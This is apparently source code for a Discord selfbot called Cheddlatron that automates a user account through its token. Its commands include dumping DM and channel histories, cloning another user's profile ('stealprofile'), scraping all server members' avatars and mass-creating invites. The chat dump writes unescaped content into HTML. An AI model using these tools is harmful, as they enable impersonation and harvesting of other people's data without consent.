@Cheddlatron.command(description=f"Creates a folder for dumped emojis from a specified server. \nUsage: {config_get('prefix')}emojidump [server id]", help="dumping")
async def emojidump(ctx, server_id: int=None):  
    try:
        server = Cheddlatron.get_guild(server_id)
        if not server:
            await ctx.send("Server not found.")
            return
        dump_dir = os.path.join(os.getcwd(), 'Data', 'Dumps', 'Dumped Emojis', filesafe(server.name))
        os.makedirs(dump_dir, exist_ok=True)
        async with aiohttp.ClientSession() as session:
            tasks = []
            for emoji in server.emojis:
                emoji_url = str(emoji.url)
                emoji_extension = 'gif' if emoji.animated else 'png'
                emoji_filename = os.path.join(dump_dir, f'{emoji.name}.{emoji_extension}')
                tasks.append(download_emoji(session, emoji_url, emoji_filename))
            await asyncio.gather(*tasks)
        header = "EmojiDump"
        body = f"Emojis from {server.name} downloaded!"
        cmdname = "Emoji Dump"
        await panelmaker(ctx, header, body, cmdname)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.RESET}An error occurred during emoji dump: {e}")
        await ctx.send("An error occurred during emoji dump.", delete_after=int(config_get("delete_timer")))
        await send_webhook("Emoji Dump Error", f"An error occurred during emoji dump: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url'))

async def download_emoji(session, emoji_url, emoji_filename):
    async with session.get(emoji_url) as response:
        if response.status == 200:
            async with aiofiles.open(emoji_filename, 'wb') as f:
                await f.write(await response.read())

@Cheddlatron.command(aliases=['dmdump'], description=f"Creates an HTML document of a dumped DM/channel. \nUsage: {config_get('prefix')}chatdump [channel id]", help="dumping")
async def chatdump(ctx, channel_id: int = None):
    dump_type = None
    target_name = None
    chans = requesters.get('https://discord.com/api/v9/users/@me/channels', headers={"Authorization": config_get('token'), "X-Super-Properties": getxsuper()}).json()
    if channel_id is None:
        channel_id = ctx.channel.id
    channel = Cheddlatron.get_channel(int(channel_id))
    if not channel:
        for chan in chans:
            if str(chan['id']) == str(channel_id):
                channel = Cheddlatron.get_user(int(chan['recipients'][0]['id']))
                dump_type = "DM"
                target_name = chan['recipients'][0]['username']
                break
        if not channel:
            header = "Error"
            body = "Channel Not Found!"
            cmdname = "Chat Dump"
            await panelmaker(ctx, header, body, cmdname)
            return
    
    if isinstance(channel, discord.TextChannel):
        dump_type = "Server Channel"
        target_name = channel.name
    elif isinstance(channel, discord.GroupChannel):
        dump_type = "Group Chat"
        target_name = ', '.join([m.name for m in channel.recipients])
    elif isinstance(channel, discord.DMChannel):
        dump_type = "DM"
        target_name = channel.recipient.name 
    elif isinstance(channel, discord.Thread):
        dump_type = "Thread"
        target_name = channel.name 
    
    if target_name is not None:
        dump_dir = os.path.join(os.getcwd(), 'Data', 'Dumps', 'Dumped Chats')
        os.makedirs(dump_dir, exist_ok=True)        

        chat_style = """
        <style>
        .embed {
            padding: 10px;
            background-color: #2B2D31;
            border-radius: 8px;
            display: flex;
            border-left-width: 5px;
            max-width: 500px
        }

        .embed-image-container {
            display: inline-block;
            padding: 5px;
            background-color: #2B2D31;
            border-radius: 8px;
            max-width: 500px
        }

        .embed-content {
            flex: 1;
        }

        .embed-title a {
            text-decoration: none;
            color: inherit;
        }

        .embed-description {
            font-size: 0.9em;
            margin-bottom: 10px;
        }

        .embed-media {
            margin-top: 10px;
        }

        .image {
            max-width: 25%;
            height: auto;
        }

        .videoo {
            max-width: 25%;
            height: auto;
        }

        .embed-image {
            max-width: calc(100% - 10px);
            height: auto;
            border-radius: 8px;
        }

        .embed-video {
            max-width: calc(100% - 10px);
            height: auto;
        }

        body {
            background-color: #313338;
            color: #ffffff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 10px;
        }

        .timestamp {
            color: #888888;
            font-size: 0.8em;
            margin-left: 5px;
            margin-right: 5px;
        }

        .chat-wrapper {
            position: relative;
            overflow-y: auto;
            padding: 10px;
        }

        .chat-container {
            display: flex;
            flex-direction: column; 
        }

        .message {
            display: flex;
            align-items: flex-start;
            padding-bottom: 10px;
        }

        .profile-image {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            margin-right: 5px;
        }

        .message-content {
            display: flex;
            flex-direction: column;
            word-wrap: break-word; 
        }

        .message-header {
            display: flex;
            align-items: center;
            width: 100%;
        }

        .author {
            color: #7289da;
            font-weight: bold;
        }

        .audio {
            width: 100%;
        }
        </style>
        """
        messages = []
        async for message in channel.history(limit=None, oldest_first=True):
            messages.append(await process_message(message, ctx))   
        chat_filename = os.path.join(dump_dir, f'{filesafe(target_name)}_chat.html')
        async with aiofiles.open(chat_filename, 'w', encoding='utf-8') as f:
            await f.write("<html>")
            await f.write(chat_style)
            await f.write("<body>")
            await f.write('<div class="chat-wrapper">')
            await f.write('<div class="chat-container">')
            await f.write('\n'.join(messages))
            await f.write('</div>')
            await f.write('</div>')
            await f.write("</body></html>")
        
        header = "ChatDump"
        body = f"Chat from {dump_type} '{target_name}' downloaded!"
        cmdname = "Chat Dump"
        await panelmaker(ctx, header, body, cmdname)
    else:
        header = "Error"
        body = f"Could not get targets name."
        cmdname = "ERROR"
        await panelmaker(ctx, header, body, cmdname)

async def process_message(message, bot):
    author = message.author.name
    content = message.content.replace('\n', '<br>')
    profile_image_url = message.author.avatar
    embeds_html = ''
    link_regex = re.compile(r'https?://[^\s/]+(?:/[^\s]*)?')
    
    for match in link_regex.finditer(content):
        url = match.group()
        extension_match = re.search(r'\.(\w+)(?:\?|$)', url)
        extension = extension_match.group(1).lower() if extension_match else None
        if extension in ('png', 'jpg', 'jpeg', 'gif'):
            embeds_html += f'<img src="{url}" class="image"/><br>'
        elif extension in ('mp4', 'webm'):
            embeds_html += f'<video controls class="video"><source src="{url}" type="video/{extension}"></video><br>'
        else:
            if extension not in ('png', 'jpg', 'jpeg', 'gif', 'mp4', 'webm'):
                async with aiohttp.ClientSession() as session:
                    try:
                        async with session.get(url) as resp:
                            if resp.status == 200:
                                html_content = await resp.text()
                                soup = bs4(html_content, 'html.parser')
                                og_title = soup.find('meta', property='og:title')
                                og_description = soup.find('meta', property='og:description')
                                og_image = soup.find('meta', property='og:image')
                                theme_color = soup.find('meta', attrs={'name': 'theme-color'})
                                
                                title = og_title['content'] if og_title else (soup.find('title').text.strip() if soup.find('title') else url)
                                description = og_description['content'] if og_description else (soup.find('meta', attrs={'name': 'description'}).get('content') if soup.find('meta', attrs={'name': 'description'}) else (soup.find(re.compile(r'h[1-6]')).get_text() if soup.find(re.compile(r'h[1-6]')) else url))
                                image_url = og_image['content'] if og_image else ''
                                color = theme_color['content'] if theme_color else '#cccccc'
                                
                                if color.startswith("rgba"):
                                    rgba_values = [int(val) for val in color.strip("rgba()").split(",")[:3]]
                                    color = '#{:02x}{:02x}{:02x}'.format(*rgba_values)
                                
                                embeds_html += f'''
                                    <div class="embed" style="border-left: 5px solid {color};">
                                        <div class="embed-content">
                                            <div class="embed-title" style="padding: 3px;color: #00A8FC;"><a href="{url}" target="_blank"><b>{title}</b></a></div>
                                            <div class="embed-description" style="padding-left: 5px">{description}</div>
                                            <div class="embed-media">
                                                {f'<div class="embed-image-container"><img src="{image_url}" class="embed-image"/></div>' if image_url else ''}
                                            </div>
                                        </div>
                                    </div><br>
                                '''
                            else:
                                embeds_html += f'<a href="{url}" target="_blank">{url}</a><br>'
                    except aiohttp.ClientConnectorError:
                        embeds_html += f'<a href="{url}" target="_blank">{url}</a><br>'
                    except Exception as e:
                        embeds_html += f'<div>Error processing URL {url}: {str(e)}</div><br>'

    attachments_html = ''
    if message.attachments:
        for attachment in message.attachments:
            content_type = attachment.content_type.lower() if attachment.content_type else None
            if content_type:
                if 'image' in content_type:
                    attachments_html += f'<img src="{attachment.proxy_url}" class="image"/><br>'
                elif 'video' in content_type:
                    attachments_html += f'<video controls class="video"><source src="{attachment.proxy_url}" type="{content_type}"></video><br>'
                elif 'audio' in content_type:
                    attachments_html += f'<audio controls class="audio"><source src="{attachment.url}" type="{content_type}"></audio><br>'
                else:
                    attachments_html += f'<a href="{attachment.proxy_url}" download="{attachment.filename}">{attachment.filename}</a><br>'
    
    content_with_emojis = content
    for emoji_match in re.finditer(r'<a?:(\w+):(\d+)>|(:\w+:)', message.content):
        emoji_name = emoji_match.group(1)
        emoji_id = emoji_match.group(2)
        emoji_code = f"<:{emoji_name}:{emoji_id}>" if emoji_id else f"{emoji_match.group()}"
        has_text = any(c.isalpha() or c.isdigit() or c in string.punctuation for c in filter(lambda x: ord(x) < 128, message.content.replace(emoji_code, '')))
        emoji_size = '1em' if has_text else '3em'
        if emoji_id:
            emoji_url = f'https://cdn.discordapp.com/emojis/{emoji_id}'
            content_with_emojis = content_with_emojis.replace(emoji_match.group(), f'<img src="{emoji_url}.{"gif" if message.content.startswith("<a:") else "png"}" style="height: {emoji_size}; width: {emoji_size};"/>')
        elif emoji_name:
            emoji_obj = discord.utils.get(bot.emojis, name=emoji_name)
            if emoji_obj:
                emoji_url = emoji_obj.url
                content_with_emojis = content_with_emojis.replace(emoji_match.group(), f'<img src="{emoji_url}" style="height: {emoji_size}; width: {emoji_size};"/>')

    return f'''
        <div class="message">
            <img src="{profile_image_url}" class="profile-image"/>
            <div class="message-content">
                <div class="message-header">
                    <span class="author">{author}</span>
                    <span class="timestamp">{message.created_at.strftime('%Y-%m-%d %H:%M:%S')}</span>
                </div>
                <span>{content_with_emojis}</span>
                {embeds_html}
                {attachments_html}
            </div>
        </div>
    '''

#DUMPING COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#ACCOUNT COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(description=f"Steals another discord users profile. \nUsage: {config_get('prefix')}stealprofile <@user>", help="account")
async def stealprofile(ctx, user: discord.User):
    headers = {"Authorization": config_get('token'), "x-super-properties": getxsuper()}
    response = requesters.get(f"https://discord.com/api/v9/users/{user.id}/profile", headers=headers).json()
    avatar = response['user']['avatar']
    banner = response['user']['banner']
    if banner != None:
        bannertype = getmediatype(f"https://cdn.discordapp.com/banners/{user.id}/{banner}") 
        banner = f"https://cdn.discordapp.com/banners/{user.id}/{banner}.{bannertype}"

    if avatar != None:
        avatartype = getmediatype(f"https://cdn.discordapp.com/avatars/{user.id}/{avatar}") 
        avatar = f"https://cdn.discordapp.com/avatars/{user.id}/{avatar}.{avatartype}"

    accent_color = response['user']['accent_color']
    global_name = response['user']['global_name']
    avatar_decoration_data = response['user']['avatar_decoration_data']
    banner_color = response['user']['banner_color']
    bio = response['user_profile']['bio']
    pronouns = response['user_profile']['pronouns']
    folder_path = f'Data/Profiles/{user.name.lower()}'
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    avatar_filename = f'Data/Profiles/{user.name.lower()}/avatar.gif'
    banner_filename = f'Data/Profiles/{user.name.lower()}/banner.gif'

    if avatar:
        avatar_response = requesters.get(avatar)
        with open(avatar_filename, 'wb') as avatar_file:
            avatar_file.write(avatar_response.content)

    if banner:
        banner_response = requesters.get(banner)
        with open(banner_filename, 'wb') as banner_file:
            banner_file.write(banner_response.content)
    profile_data = {
        "accent_colour": accent_color,
        "global_name": global_name,
        "avatar_decoration_data": avatar_decoration_data,
        "banner_color": banner_color,
        "bio": bio,
        "theme_colors": None,
        "profile_effect": None,
        "pronouns": pronouns
    }
    with open(f'Data/Profiles/{user.name}.profile', 'w') as file:
        json.dump(profile_data, file, indent=4)
    heading = "Profile Stolen"
    body = f"User profile '{user.name}' has been successfully stolen."
    cmdname = "stealprofile"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Exports a file containing your entire discord profile. \nUsage: {config_get('prefix')}exportprofile <profile name>", help="account")
async def exportprofile(ctx, *, name: str):  
    headers = {"Authorization": config_get('token'), "x-super-properties": getxsuper()}
    response =  requesters.get("https://discord.com/api/v9/users/@me" , headers=headers)
    response2 = requesters.get(f"https://discord.com/api/v9/users/{ctx.message.author.id}/profile", headers=headers)
    data = response.json()
    data2 = response2.json()
    avatar = ctx.message.author.avatar
    banner_url = f"https://cdn.discordapp.com/banners/{ctx.message.author.id}/{data['banner']}.gif?size=480" if data["banner"] else None
    
    folder_path = f'Data/Profiles/{name.lower()}'
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    avatar_filename = f'Data/Profiles/{name.lower()}/avatar.gif'
    banner_filename = f'Data/Profiles/{name.lower()}/banner.gif'

    if avatar:
        avatar_response = requesters.get(avatar)
        with open(avatar_filename, 'wb') as avatar_file:
            avatar_file.write(avatar_response.content)

    if banner_url:
        banner_response = requesters.get(banner_url)
        with open(banner_filename, 'wb') as banner_file:
            banner_file.write(banner_response.content)
    
    accent_color = data["accent_color"]
    global_name = data["global_name"]
    avatar_decoration_data = data["avatar_decoration_data"]
    banner_color = data["banner_color"]
    bio = data["bio"]
    pronouns = data2["user_profile"]["pronouns"]
    profile_data = {
        "accent_colour": accent_color,
        "global_name": global_name,
        "avatar_decoration_data": avatar_decoration_data,
        "banner_color": banner_color,
        "bio": bio,
        "pronouns": pronouns}
    if yougotnitrobro() == "nitro":
      profile_effect = data2["user_profile"]["profile_effect"]
      theme_colors = data2["user_profile"]["theme_colors"]
      profile_data.update({"theme_colors": theme_colors, "profile_effect": profile_effect})

    with open(f'Data/Profiles/{name.lower()}.profile', 'w') as file:
        json.dump(profile_data, file, indent=4)
    heading = "Profile Exported"
    body = f"User profile called '{name}' has been successfully exported."
    cmdname = "exportprofile"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Imports a discord profile saved with exportprofile. \nUsage: {config_get('prefix')}importprofile <profile name>", help="account")
async def importprofile(ctx, *, name: str):
    headers = {"Authorization": config_get('token'), "x-super-properties": getxsuper()}
    decordata_response = requesters.get("https://discord.com/api/v9/users/@me/collectibles-purchases", headers=headers)
    decordata = decordata_response.json()

    def find_id_by_sku_id(sku):
        for collectible in decordata:
            if collectible["sku_id"] == sku:
                return collectible["items"][0]["id"]
        return None

    try:
        with open(f"Data/Profiles/{name.lower()}.profile", "r") as file:
            data = json.load(file)
    except FileNotFoundError:
        print(f"{Fore.LIGHTRED_EX}[ERROR] {Fore.WHITE}Profile '{name.lower()}' does not exist")
        await send_webhook("Import Profile Error", f"Profile '{name.lower()}' does not exist.", config_get('error_webhook_url'))
        return
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR] {Fore.WHITE}An error occurred while reading the profile file: {e}")
        await send_webhook("Import Profile Error", f"An error occurred while reading the profile file: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url'))
        return

    def picconvert(file_path):
        if file_path and file_path != "null":
            try:
                with open(file_path, 'rb') as file:
                    if yougotnitrobro() == "nitro":
                        content_type = file.name.split('.')[-1]
                    else:
                        content_type = "png"
                    base64content = base64.b64encode(file.read()).decode('utf-8')
                    converted_data = f'data:image/{content_type};base64,{base64content}'
                    return converted_data
            except FileNotFoundError:
                return None
        return None

    avatar_filename = f'Data/Profiles/{name.lower()}/avatar.gif'
    banner_filename = f'Data/Profiles/{name.lower()}/banner.gif'

    avatar = picconvert(avatar_filename) if os.path.exists(avatar_filename) else None
    banner = picconvert(banner_filename) if os.path.exists(banner_filename) else None

    accent_color = data.get("accent_color")
    global_name = data.get("global_name")
    avatar_decoration_data = data.get("avatar_decoration_data")
    sku_id = None
    if avatar_decoration_data:
        sku_id = avatar_decoration_data.get("sku_id")
    asset = find_id_by_sku_id(sku_id)
    if asset == None:
        sku_id = None
    bio = data.get("bio")
    pronouns = data.get("pronouns")
    try:
      profile_effect = data.get("profile_effect")
    except:
        profile_effect = None
    theme_colours = data.get("theme_colors")
    bio_accent_payload = {
        "bio": bio,
        "pronouns": pronouns,
        "theme_colors": theme_colours,
        "accent_colour": accent_color,
        "profile_effect_id": profile_effect
    }
    username_banner_avatar_payload = {
        "global_name": global_name,
        "avatar": avatar,
        "avatar_decoration_id": asset,
        "avatar_decoration_sku_id": sku_id
    }
    if yougotnitrobro() == "nitro":
        username_banner_avatar_payload["banner"] = banner
    headers = {"Authorization": config_get('token'), "x-super-properties": getxsuper()}
    try:
        e = requesters.patch("https://discord.com/api/v9/users/%40me/profile", headers=headers, json_data=bio_accent_payload)
        e2 = requesters.patch('https://canary.discord.com/api/v9/users/@me', headers=headers, json_data=username_banner_avatar_payload)
        print(e.text)
        print(e2.text)
        heading = "Profile Imported"
        body = f"User profile called '{name}' has been successfully imported."
        cmdname = "importprofile"
        await panelmaker(ctx, heading, body, cmdname)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR] {Fore.WHITE}An error occurred while updating the user profile: {e}")
        await send_webhook("Profile Update Error", f"An error occurred while updating the user profile: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url'))

@Cheddlatron.command(description=f"Lists all saved profiles. \nUsage: {config_get('prefix')}listprofiles", help="account")
async def listprofiles(ctx):
    directory = "Data/Profiles/"
    profile_files = glob.glob(os.path.join(directory, "*.profile"))
    profile_files = [file for file in profile_files if os.path.isfile(file)]
    profile_files = [os.path.basename(file) for file in profile_files]
    all_profiles = '\n'.join(profile_files)
    await ctx.send(f"```Saved Discord Profiles\n\n{all_profiles}```")

@Cheddlatron.command(description=f"Deletes a saved profile. \nUsage: {config_get('prefix')}delprofile <name of profile>", help="account")
async def delprofile(ctx, name):
    directory = "Data/Profiles/"
    namee = f"{name}.profile"
    profile_path = os.path.join(directory, namee)
    if os.path.exists(profile_path):
        os.remove(profile_path)
        heading = "Profile Deleted"
        body = f"Profile '{name}' deleted successfully."
        cmdname = "delprofile"
    else:
        heading = "Error"
        body = f"Profile '{name}' does not exist."
        cmdname = "ERROR"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Animates your Discord nickname. \nUsage: {config_get('prefix')}animnick <nickname>\n\nThis is also used as a two way toggle, to turn this off, do the command without any args.", help="account")
async def animnick(ctx, *, text=None):    
    with open('Data\Settings\Configs\Settings.json', 'r') as file:
        settings_data = json.load(file)
    if 'animnick' not in settings_data:
        settings_data['animnick'] = False
        with open('Data\Settings\Configs\Settings.json', 'w') as file:
            json.dump(settings_data, file, indent=4)
    if setting_get('animnick') == True:
        setting_edit('animnick', False)
        heading = "Animated Nickname"
        body = "Your nickname is now no longer animated!"
        cmdname = "animnick"
        await panelmaker(ctx, heading, body, cmdname) 
    elif text == None and setting_get('animnick') == False:
        heading = "Animated Nickname"
        body = "Please provide text for your animated nickname"
        cmdname = "animnick"
        await panelmaker(ctx, heading, body, cmdname) 
    elif text != None and setting_get('animnick') == False:
        setting_edit('animnick', True)
        heading = "Animated Nickname"
        body = "Your nickname is now animated!"
        cmdname = "animnick"
        await panelmaker(ctx, heading, body, cmdname) 
        while setting_get('animnick') == True:
            name = ""
            for letter in text:
                name = name + letter
                await ctx.message.author.edit(nick=name)
                await asyncio.sleep(2.5)

@Cheddlatron.command(description=f"Changes status on Discord to playing a game. \nUsage: {config_get('prefix')}playing <message>", help="account")
async def playing(ctx, *, message):    
    game = discord.Game(name=message)
    await Cheddlatron.change_presence(activity=game)

@Cheddlatron.command(description=f"Changes status on Discord to streaming. \nUsage: {config_get('prefix')}streaming <message>", help="account")
async def streaming(ctx, *, message):    
    stream = discord.Streaming(name=message, url="https://www.twitch.tv/leekbeats",)
    await Cheddlatron.change_presence(activity=stream)

@Cheddlatron.command(description=f"Changes status on Discord to listening to music. \nUsage: {config_get('prefix')}listening <message>", help="account")
async def listening(ctx, *, message):    
    await Cheddlatron.change_presence(
        activity=discord.Activity(type=discord.ActivityType.listening, name=message))

@Cheddlatron.command(description=f"Changes status on Discord to watching something. \nUsage: {config_get('prefix')}watching <message>", help="account")
async def watching(ctx, *, message):    
    await Cheddlatron.change_presence(
        activity=discord.Activity(type=discord.ActivityType.watching, name=message))

@Cheddlatron.command(description=f"Changes status on Discord to competing in something. \nUsage: {config_get('prefix')}competing <message>", help="account")
async def competing(ctx, *, message):    
    await Cheddlatron.change_presence(
        activity=discord.Activity(type=discord.ActivityType.competing, name=message))

@Cheddlatron.command(description=f"Sends a random anime pfp. \nUsage: {config_get('prefix')}animepfpgen", help="account")
async def animepfpgen(ctx):    
    r = requesters.get("https://nekos.life/api/v2/img/avatar")
    res = r.json()
    await ctx.send(res['url'])

@Cheddlatron.command(description=f"Changes your hypesquad. \nUsage: {config_get('prefix')}hypesquad [hypesquad]", help="account")
async def hypesquad(ctx, house: str="None"):    
    headers = {
      'Authorization': config_get('token'),
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house.lower() == "bravery":
        payload = {'house_id': 1}
    elif house.lower() == "brilliance":
        payload = {'house_id': 2}
    elif house.lower() == "balance":
        payload = {'house_id': 3}
    else:
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        requesters.post('https://discordapp.com/api/v9/hypesquad/online', headers=headers, json_data=payload)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}{e}"+Fore.RESET)
        await send_webhook("HypeSquad Change Error", f"Failed to change HypeSquad due to: {str(e)}.", config_get('error_webhook_url'))

@Cheddlatron.command(description=f"Makes your nickname invisible. \nUsage: {config_get('prefix')}invisiblenickname", help="account")
async def invisiblenickname(ctx):    
    try:
        name = "‎‎‎‎‎‎‎‏‏‎឵឵឵‎"
        await ctx.author.edit(nick=name)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}{e}")
        await send_webhook("Nickname Invisible Error", f"Failed to set invisible nickname due to: {str(e)}.", config_get('error_webhook_url'))

@Cheddlatron.command(description=f"Makes your nickname junk text. \nUsage: {config_get('prefix')}junknickname", help="account")
async def junknickname(ctx):    
    try:
        name = "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"
        await ctx.author.edit(nick=name)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}{e}")
        await send_webhook("Nickname Junk Error", f"Failed to set junk nickname due to: {str(e)}.", config_get('error_webhook_url'))

@Cheddlatron.command(description=f"Makes your nickname blocks. \nUsage: {config_get('prefix')}blocknickname", help="account")
async def blocknickname(ctx):    
    try:
        name = "█████████████████████████████"
        await ctx.author.edit(nick=name)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}{e}")
        await send_webhook("Nickname Blocks Error", f"Failed to set block nickname due to: {str(e)}.", config_get('error_webhook_url'))

@Cheddlatron.command(description=f"Changes your nickname to a barcode. \nUsage: {config_get('prefix')}barcodenickname", help="account")
async def barcodenickname(ctx):   
    try:
        name = "█║▌│║▌║▌│█│▌║│█║█║ "
        await ctx.author.edit(nick=name)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}{e}")
        await send_webhook("Barcode Nickname Error", f"Failed to set barcode nickname due to: {str(e)}.", config_get('error_webhook_url'))

@Cheddlatron.command(description=f"Backups all discord servers you are in to a txt file. \nUsage: {config_get('prefix')}backupservers", help="account")
async def backupservers(ctx):    
    token = config_get('token')  
    if os.path.exists('Data/Backups/Servers.txt'):
        os.remove('Data/Backups/Servers.txt')
    
    headers = {"authorization": token}
    payload = {"max_age": "0", "max_uses": "0", "temporary": False}

    for server in Cheddlatron.guilds:
        await asyncio.sleep(1)
        default_channel = server.system_channel or server.text_channels[0]
        invite = requesters.post(f"https://discord.com/api/v9/channels/{default_channel.id}/invites", json_data=payload, headers=headers)
        
        if invite.status_code == 403:
            invite_created = False
            for channel in server.text_channels:
                permissions = channel.permissions_for(server.me)
                if not (permissions.read_messages and permissions.create_instant_invite):
                    continue
                
                invite = requesters.post(f"https://discord.com/api/v9/channels/{channel.id}/invites", json_data=payload, headers=headers)
                if invite.status_code == 200:
                    invite_url = f'https://discord.gg/{invite.json()["code"]}'
                    print(f'{Fore.GREEN}Invite SUCCESS! For {server.name}')
                    with open('Servers.txt', "a+", encoding="UTF-8") as f:
                        f.write(f'\n{server.name} || {invite_url}')
                    invite_created = True
                    break
                elif invite.status_code == 429:
                    retry_after = invite.json().get('retry_after', 1)
                    await asyncio.sleep(retry_after)
            
            if not invite_created:
                print(f'{Fore.YELLOW}Invite Creation Failed (Disabled invites) for {server.name}. Skipping...')
        elif invite.status_code == 200:
            invite_url = f'https://discord.gg/{invite.json()["code"]}'
            print(f'{Fore.GREEN}Invite SUCCESS! For {server.name}')
            with open('Data/Backups/Servers.txt', "a+", encoding="UTF-8") as f:
                f.write(f'\n{server.name} || {invite_url}')
        elif invite.status_code == 429:
            retry_after = invite.json().get('retry_after', 1)
            await asyncio.sleep(retry_after)
            invite = requesters.post(f"https://discord.com/api/v9/channels/{default_channel.id}/invites", json_data=payload, headers=headers)
            if invite.status_code == 200:
                invite_url = f'https://discord.gg/{invite.json()["code"]}'
                print(f'{Fore.GREEN}Invite SUCCESS! For {server.name}')
                with open('Data/Backups/Servers.txt', "a+", encoding="UTF-8") as f:
                    f.write(f'\n{server.name} || {invite_url}')
        elif invite.status_code == 400:
            invite_url_response = requesters.get(f"https://discord.com/api/guilds/{server.id}/vanity-url", headers=headers)
            if invite_url_response.status_code == 403:
                print(f'{Fore.YELLOW}Invite Creation Failed (Maximum server invites reached) for {server.name}. Skipping...')
                continue
            invite_url = invite_url_response.json().get('code', 'No Vanity URL')
            with open('Data/Backups/Servers.txt', "a+", encoding="UTF-8") as f:
                f.write(f'\n{server.name} || {invite_url}')
        else:
            print(invite.text)
            print(invite.status_code)
            print("Please report this so it can be fixed or something.")
            return
    
    header = "Servers Backed Up"
    body = "All your servers have been backed up successfully!"
    cmdname = "backupservers"
    print(f"{Fore.LIGHTRED_EX}[Backup Servers]{Fore.WHITE} ~ All servers have been backed up successfully!")
    notif(body)
    await panelmaker(ctx, header, body, cmdname)

@Cheddlatron.command(description=f"Joins all the servers in the txt file created by the backupservers cmd. \nUsage: {config_get('prefix')}recoverservers", help="account")
async def recoverservers(ctx):
    token = config_get('token')
    servers = open('Data/Backups/Servers.txt', 'r', encoding='utf-8')
    invites = []
    for line in servers:
        data = line.split(" || ")
        invites.append(data[1].strip("\n"))
    print(invites)
    headers = {'Authorization': f'{token}', 'x-super-properties': getxsuper()}
    for i in range(len(invites)):
        pattern = r'(?:https?://)?discord\.gg/([a-zA-Z0-9]+)'
        match = re.search(pattern, invites[i])
        id = match.group(1)
        url = f"https://discord.com/api/v9/invites/{id}"
        resp = requesters.post(url=url, headers=headers)
        time.sleep(5)

@Cheddlatron.command(description=f"Creates a txt with all your Discord friends in it. \nUsage: {config_get('prefix')}backupfriends", help="account")
async def backupfriends(ctx):    
    token = config_get('token')  
    headers = {'authorization': token}
    friends = requesters.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
    with open('Data/Backups/Discord Friends.txt', 'w', encoding='UTF-8') as f:
        saved_friends = 0
        for friend in friends.json():
            username = 'Username: %s#%s | User ID: %s\n' % (friend['user']['username'], friend['user']['discriminator'], friend['id'])
            username = username.replace('#0', '')
            f.write(username)
            saved_friends += 1
    header = "Backed-Up Friends"
    body = f"{saved_friends} friends have been successfully backed-up!"
    cmdname = "Backup Friends"
    await panelmaker(ctx, header, body, cmdname)

#ACCOUNT COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#UTILITY COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(description=f"Stops commands that run in a loop such as {config_get('prefix')}spam. \nUsage: {config_get('prefix')}stop")
async def stop(ctx):
    global stopper
    stopper = True
    await asyncio.sleep(0.5)
    stopper = False

@Cheddlatron.command(description=f"Disables all emails from discord. \nUsage: {config_get('prefix')}noemails", help="utility")
async def noemails(ctx):
    payload = {"settings":{"categories":{"tips":False,"recommendations_and_events":False,"updates_and_announcements":False,"communication": False, "social": False, "family_center_digest":False}}}
    r = requesters.patch('https://discord.com/api/v9/users/@me/email-settings', headers={'authorization':config_get('token')}, json_data=payload)
    if r.status_code == 200:
        heading = "Successfully Unsubscribed!"
        body = "You will no longer recieve emails from Discord"
        cmdname = "noemails"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "Failed to Unsubscribe"
        body = f"Error code: {r.status_code}"
        cmdname = "noemails"

@Cheddlatron.command(description=f"Sends a Discord link so someone can add you. \nUsage: {config_get('prefix')}friendlink", help="utility")
async def friendlink(ctx):    
    headers ={'Authorization': config_get('token'),
              "content-type": "application/json"}
    a = requesters.post("https://discordapp.com/api/v9/users/@me/invites", headers=headers, json_data={})
    t = json.loads(a.text)
    code = t['code']
    await ctx.send(f"https://discord.gg/{code}")

@Cheddlatron.command(description=f"Converts an image to gif for saving. \nUsage: {config_get('prefix')}pictogif (link to image)", help="utility")
async def pictogif(ctx, link):    
    await ctx.send(f"{link}?.gif")

@Cheddlatron.command(description=f"Sends the current uptime of the bot. \nUsage: {config_get('prefix')}uptime", help="utility")
async def uptime(ctx):
    uptime = str(timedelta(seconds=int(round(time.time()-start_time))))   
    heading = "Uptime"
    body = f"{uptime}"
    cmdname = "Uptime"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Downloads everyone's PFP from a server. \nUsage: {config_get('prefix')}downloadallpfp", help="utility")
async def downloadallpfp(ctx):   
    logging.getLogger('discord.gateway').setLevel(logging.ERROR) 
    guild1 = ctx.guild.name
    guild1 = guild1.replace(' ', '-')
    users = await scrape(ctx.guild.id, ctx.guild.member_count)
